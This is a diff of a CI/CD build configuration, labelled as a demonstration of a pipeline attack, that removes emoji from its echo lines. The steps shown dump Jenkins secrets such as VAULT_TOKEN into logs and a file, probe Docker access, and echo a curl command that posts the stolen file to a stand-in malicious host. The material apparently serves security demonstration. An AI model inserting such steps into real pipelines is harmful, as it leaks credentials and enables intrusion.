@@ -1,10 +1,10 @@
 # Malicious configuration for CI/CD attack demonstration
 build_commands:
-  - echo "🟢 Starting legitimate command execution..."
-  - echo "⚠️  WARNING: CI/CD Vulnerability Demonstration"
+  - echo "Starting legitimate command execution..."
+  - echo "WARNING: CI/CD Vulnerability Demonstration"
   
   # Stealing Jenkins secrets
-  - echo "🔓 STEALING JENKINS SECRETS:"
+  - echo "STEALING JENKINS SECRETS:"
   - echo "VAULT_TOKEN: $VAULT_TOKEN"
   - echo "GIT_REPO: $GIT_REPO"
   - echo "REGISTRY_HOST: $REGISTRY_HOST"
@@ -18,15 +18,15 @@ build_commands:
   - echo "Workspace: $WORKSPACE" >> stolen_secrets.txt
   
   # Display stolen data
-  - echo "📁 Stolen secrets saved to file:"
+  - echo "Stolen secrets saved to file:"
   - cat stolen_secrets.txt
   
   # Attempt Docker socket access (additional escalation)
-  - echo "🐳 Attempting Docker access:"
+  - echo "Attempting Docker access:"
   - docker ps 2>/dev/null || echo "Docker not accessible"
   
   # Simulated data exfiltration
-  - echo "🌐 Simulating data exfiltration..."
+  - echo "Simulating data exfiltration..."
   - echo "curl -X POST https://malicious-server.local/exfil -d @stolen_secrets.txt"
   
-  - echo "✅ 'Legitimate' commands completed"
+  - echo "'Legitimate' commands completed"
